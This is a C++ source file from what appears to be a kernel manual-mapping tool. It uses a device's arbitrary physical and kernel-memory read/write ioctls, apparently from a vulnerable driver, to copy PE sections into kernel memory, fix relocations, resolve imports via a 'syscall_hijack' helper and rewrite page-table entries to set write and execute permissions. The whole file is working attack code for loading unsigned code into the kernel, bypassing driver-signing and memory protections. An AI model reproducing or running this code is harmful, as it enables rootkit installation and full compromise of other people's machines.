#include "kern_map.h"
#include "ioctl.h"
#include "kern_scan.h"
#include "pagewalk.h"
#include "syscall_hijack.h"

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <vector>

namespace {

bool write_kva(HANDLE device, uint64_t cr3, uint64_t kva, const void* src, size_t size) {
    const uint8_t* in = static_cast<const uint8_t*>(src);
    while (size) {
        uint64_t page_off = kva & 0xFFFULL;
        size_t   chunk    = std::min<size_t>(size, 0x1000 - page_off);
        uint64_t phys     = 0;
        if (!pagewalk::va_to_phys(device, cr3, kva, phys)) return false;
        if (!ioctl::write_physical(device, phys, in, chunk)) return false;
        kva  += chunk;
        in   += chunk;
        size -= chunk;
    }
    return true;
}

bool read_kva(HANDLE device, uint64_t cr3, uint64_t kva, void* dst, size_t size) {
    (void)cr3;
    return ioctl::read_kernel_virtual(device, kva, dst, size);
}

const IMAGE_NT_HEADERS64* nt_headers(const uint8_t* pe, size_t n) {
    if (n < sizeof(IMAGE_DOS_HEADER)) return nullptr;
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(pe);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    if (dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > n) return nullptr;
    const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;
    return nt;
}

const IMAGE_SECTION_HEADER* sections_of(const IMAGE_NT_HEADERS64* nt) {
    return reinterpret_cast<const IMAGE_SECTION_HEADER*>(
        reinterpret_cast<const uint8_t*>(&nt->OptionalHeader)
        + nt->FileHeader.SizeOfOptionalHeader);
}

// Translate an RVA to a file offset inside the staging PE buffer.
uint32_t rva_to_raw(const IMAGE_NT_HEADERS64* nt, uint32_t rva) {
    const auto* sec = sections_of(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        uint32_t vstart = sec[i].VirtualAddress;
        uint32_t vsize  = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize
                                                  : sec[i].SizeOfRawData;
        if (rva >= vstart && rva < vstart + vsize) {
            return sec[i].PointerToRawData + (rva - vstart);
        }
    }
    return 0;
}

} // namespace

namespace kern_map {

bool process_relocations(uint8_t* pe_buf_mut, size_t pe_size,
                         uint64_t kernel_base, int& out_fixups_applied) {
    out_fixups_applied = 0;

    const auto* nt = nt_headers(pe_buf_mut, pe_size);
    if (!nt) return false;

    if (nt->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED) {
        std::printf("[*] reloc: stripped — nothing to do\n");
        return true;
    }

    const auto& reloc_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (reloc_dir.Size == 0 || reloc_dir.VirtualAddress == 0) {
        std::printf("[*] reloc: empty directory — nothing to do\n");
        return true;
    }

    int64_t delta = static_cast<int64_t>(kernel_base) -
                    static_cast<int64_t>(nt->OptionalHeader.ImageBase);
    if (delta == 0) {
        std::printf("[*] reloc: delta == 0, nothing to fix up\n");
        return true;
    }

    uint32_t reloc_raw = rva_to_raw(nt, reloc_dir.VirtualAddress);
    if (reloc_raw == 0 || reloc_raw + reloc_dir.Size > pe_size) {
        std::printf("[!] reloc: directory RVA %08X not in any section\n",
                    reloc_dir.VirtualAddress);
        return false;
    }

    uint8_t* const reloc_end = pe_buf_mut + reloc_raw + reloc_dir.Size;
    uint8_t*       reloc_ptr = pe_buf_mut + reloc_raw;

    while (reloc_ptr < reloc_end) {
        if (reloc_ptr + 8 > reloc_end) break;
        uint32_t block_rva  = *reinterpret_cast<uint32_t*>(reloc_ptr + 0);
        uint32_t block_size = *reinterpret_cast<uint32_t*>(reloc_ptr + 4);
        if (block_size < 8 || reloc_ptr + block_size > reloc_end) break;

        uint32_t  num_entries = (block_size - 8) / 2;
        uint16_t* entries     = reinterpret_cast<uint16_t*>(reloc_ptr + 8);

        for (uint32_t i = 0; i < num_entries; ++i) {
            uint16_t e      = entries[i];
            uint8_t  type   = static_cast<uint8_t>(e >> 12);
            uint16_t offset = e & 0x0FFF;

            if (type == IMAGE_REL_BASED_ABSOLUTE) continue;

            uint32_t target_rva = block_rva + offset;
            uint32_t target_raw = rva_to_raw(nt, target_rva);
            if (target_raw == 0) continue;

            if (type == IMAGE_REL_BASED_HIGHLOW) {
                if (target_raw + 4 > pe_size) continue;
                uint32_t* p = reinterpret_cast<uint32_t*>(pe_buf_mut + target_raw);
                *p += static_cast<uint32_t>(delta);
                ++out_fixups_applied;
            } else if (type == IMAGE_REL_BASED_DIR64) {
                if (target_raw + 8 > pe_size) continue;
                uint64_t* p = reinterpret_cast<uint64_t*>(pe_buf_mut + target_raw);
                *p += static_cast<uint64_t>(delta);
                ++out_fixups_applied;
            }
        }

        reloc_ptr += block_size;
    }

    std::printf("[+] reloc: applied %d fixups (delta = %lld)\n",
                out_fixups_applied, static_cast<long long>(delta));
    return true;
}

bool copy_sections(HANDLE device, uint64_t cr3,
                   const uint8_t* pe_buf, size_t pe_size,
                   uint64_t kernel_base) {
    const auto* nt = nt_headers(pe_buf, pe_size);
    if (!nt) return false;

    const auto* sec = sections_of(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        char name[IMAGE_SIZEOF_SHORT_NAME + 1] = {};
        std::memcpy(name, sec[i].Name, IMAGE_SIZEOF_SHORT_NAME);

        if (std::strcmp(name, ".reloc") == 0) continue;

        uint64_t kern_target = kernel_base + sec[i].VirtualAddress;
        uint32_t raw_off     = sec[i].PointerToRawData;
        uint32_t raw_size    = sec[i].SizeOfRawData;

        if (raw_size == 0) continue;
        if (raw_off + raw_size > pe_size) {
            std::printf("[!] section '%s' raw range out of buffer bounds\n", name);
            return false;
        }

        if (!write_kva(device, cr3, kern_target, pe_buf + raw_off, raw_size)) {
            std::printf("[!] write_kva failed for section '%s'\n", name);
            return false;
        }
    }
    return true;
}

bool resolve_imports(HANDLE device, uint64_t cr3,
                     const uint8_t* pe_buf, size_t pe_size,
                     uint64_t kernel_base,
                     ImportResolveStats& stats) {
    stats = {};

    const auto* nt = nt_headers(pe_buf, pe_size);
    if (!nt) return false;

    const auto& imp_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (imp_dir.Size == 0 || imp_dir.VirtualAddress == 0) {
        std::printf("[*] imports: empty directory — nothing to resolve\n");
        return true;
    }

    uint32_t desc_raw = rva_to_raw(nt, imp_dir.VirtualAddress);
    if (desc_raw == 0 || desc_raw + imp_dir.Size > pe_size) {
        std::printf("[!] imports: directory RVA %08X not in any section\n",
                    imp_dir.VirtualAddress);
        return false;
    }

    // syscall_hijack::resolve_kernel_export takes a Context to share device/cr3.
    // We build a minimal one here (only device + cr3 fields are used by that
    // function's internals).
    syscall_hijack::Context ctx{};
    ctx.device = device;
    ctx.cr3    = cr3;

    const auto* desc = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(pe_buf + desc_raw);

    for (;; ++desc) {
        if (desc->Name == 0 && desc->FirstThunk == 0) break;

        uint32_t name_raw = rva_to_raw(nt, desc->Name);
        if (name_raw == 0) {
            std::printf("[!] imports: descriptor Name RVA %08X not in any section\n", desc->Name);
            ++stats.failed_count;
            continue;
        }
        const char* dll = reinterpret_cast<const char*>(pe_buf + name_raw);

        uint64_t dll_base = kern_scan::resolve_loaded_driver_base(dll);
        if (!dll_base) {
            std::printf("[!] imports: can't resolve kernel module '%s'\n", dll);
            ++stats.failed_count;
            continue;
        }
        ++stats.dll_count;
        std::printf("    from '%s' (base %016llX):\n", dll, (unsigned long long)dll_base);

        uint32_t int_rva = desc->OriginalFirstThunk ? desc->OriginalFirstThunk
                                                    : desc->FirstThunk;
        uint32_t iat_rva = desc->FirstThunk;

        uint32_t int_raw = rva_to_raw(nt, int_rva);
        if (int_raw == 0) {
            std::printf("[!] imports: INT RVA %08X not in any section\n", int_rva);
            ++stats.failed_count;
            continue;
        }

        for (uint32_t i = 0; ; ++i) {
            uint64_t thunk = 0;
            if (int_raw + i * 8 + 8 > pe_size) break;
            std::memcpy(&thunk, pe_buf + int_raw + i * 8, 8);
            if (thunk == 0) break;

            uint64_t resolved = 0;
            if (thunk & 0x8000000000000000ULL) {
                // Import by ordinal — would require ordinal-based resolver
                // in the target module's export directory. Not implementing
                // here because modern kernel drivers import by name.
                std::printf("      [ord #%llu] — import-by-ordinal not supported, skipped\n",
                            (unsigned long long)(thunk & 0xFFFF));
                ++stats.failed_count;
            } else {
                uint32_t hint_name_rva = static_cast<uint32_t>(thunk);
                uint32_t hint_name_raw = rva_to_raw(nt, hint_name_rva);
                if (hint_name_raw == 0 || hint_name_raw + 3 > pe_size) {
                    std::printf("      [bad hint-name RVA %08X]\n", hint_name_rva);
                    ++stats.failed_count;
                    continue;
                }
                // IMAGE_IMPORT_BY_NAME: WORD Hint + char Name[]
                const char* fn_name = reinterpret_cast<const char*>(
                    pe_buf + hint_name_raw + 2);

                resolved = syscall_hijack::resolve_kernel_export(ctx, dll_base, fn_name);
                if (!resolved) {
                    std::printf("      [!] '%s' not found in %s exports\n", fn_name, dll);
                    ++stats.failed_count;
                    continue;
                }
                std::printf("      %-40s -> %016llX\n", fn_name,
                            (unsigned long long)resolved);
            }

            if (resolved) {
                uint64_t iat_slot_kva = kernel_base + iat_rva + i * 8;
                if (!write_kva(device, cr3, iat_slot_kva, &resolved, 8)) {
                    std::printf("      [!] IAT write failed at %016llX\n",
                                (unsigned long long)iat_slot_kva);
                    ++stats.failed_count;
                    continue;
                }
                ++stats.function_count;
            }
        }
    }

    std::printf("[+] imports: %d DLLs, %d functions resolved, %d failures\n",
                stats.dll_count, stats.function_count, stats.failed_count);
    return stats.failed_count == 0;
}

bool apply_section_protection(HANDLE device, uint64_t cr3,
                              const uint8_t* pe_buf, size_t pe_size,
                              uint64_t kernel_base, uint64_t pte_base) {
    (void)cr3;
    const auto* nt = nt_headers(pe_buf, pe_size);
    if (!nt) return false;

    const auto* sec = sections_of(nt);
    int pages_total = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        char name[IMAGE_SIZEOF_SHORT_NAME + 1] = {};
        std::memcpy(name, sec[i].Name, IMAGE_SIZEOF_SHORT_NAME);
        if (std::strcmp(name, ".reloc") == 0) continue;

        const uint32_t chars = sec[i].Characteristics;
        const bool executable = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
        const bool writable   = (chars & IMAGE_SCN_MEM_WRITE)   != 0;

        uint64_t vsize = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize
                                                 : sec[i].SizeOfRawData;
        uint64_t page_start = (kernel_base + sec[i].VirtualAddress) & ~0xFFFULL;
        uint64_t page_end   = (kernel_base + sec[i].VirtualAddress + vsize + 0xFFF)
                              & ~0xFFFULL;

        int section_pages = 0;
        for (uint64_t va = page_start; va < page_end; va += 0x1000) {
            uint64_t pte_va = pte_base + (((va >> 12) << 3) & 0x7FFFFFFFF8ULL);

            uint64_t pte = 0;
            if (!ioctl::read_kernel_virtual(device, pte_va, &pte, sizeof(pte))) {
                std::printf("[!] protection: PTE read failed at PTE VA %016llX (for VA %016llX)\n",
                            (unsigned long long)pte_va, (unsigned long long)va);
                return false;
            }

            uint64_t pte_before = pte;

            constexpr uint64_t PTE_RW = 1ULL << 1;
            constexpr uint64_t PTE_NX = 1ULL << 63;

            if (writable)   pte |= PTE_RW;
            else            pte &= ~PTE_RW;

            if (executable) pte &= ~PTE_NX;
            else            pte |= PTE_NX;

            if (!ioctl::write_kernel_virtual(device, pte_va, &pte, sizeof(pte))) {
                std::printf("[!] protection: PTE write failed at PTE VA %016llX\n",
                            (unsigned long long)pte_va);
                return false;
            }

            if (pages_total == 0) {
                uint64_t readback = 0;
                ioctl::read_kernel_virtual(device, pte_va, &readback, sizeof(readback));
                std::printf("    [diag] first PTE: va=%016llX pte_va=%016llX before=%016llX after=%016llX readback=%016llX\n",
                            (unsigned long long)va, (unsigned long long)pte_va,
                            (unsigned long long)pte_before, (unsigned long long)pte,
                            (unsigned long long)readback);
            }

            ++section_pages;
            ++pages_total;
        }

        std::printf("    '%s' %s%s (%d page%s)\n",
                    name,
                    executable ? "X" : "-",
                    writable   ? "W" : "R",
                    section_pages,
                    section_pages == 1 ? "" : "s");
    }

    std::printf("[+] section protection set (%d pages total)\n", pages_total);
    return true;
}

bool verify_bytes_at(HANDLE device, uint64_t cr3,
                     const uint8_t* pe_buf, size_t pe_size,
                     uint64_t kernel_base, uint32_t rva, size_t bytes) {
    const auto* nt = nt_headers(pe_buf, pe_size);
    if (!nt) return false;

    uint32_t raw = rva_to_raw(nt, rva);
    if (raw == 0 || raw + bytes > pe_size) return false;

    std::vector<uint8_t> readback(bytes);
    if (!read_kva(device, cr3, kernel_base + rva, readback.data(), bytes)) return false;

    if (std::memcmp(readback.data(), pe_buf + raw, bytes) != 0) {
        std::printf("[!] verify: mismatch at RVA %08X\n", rva);
        std::printf("    expected: ");
        for (size_t i = 0; i < bytes; ++i) std::printf("%02X ", pe_buf[raw + i]);
        std::printf("\n    got:      ");
        for (size_t i = 0; i < bytes; ++i) std::printf("%02X ", readback[i]);
        std::printf("\n");
        return false;
    }

    std::printf("[+] verify: %zu bytes match at kernel VA %016llX (RVA %08X)\n",
                bytes, static_cast<unsigned long long>(kernel_base + rva), rva);
    return true;
}

} // namespace kern_map
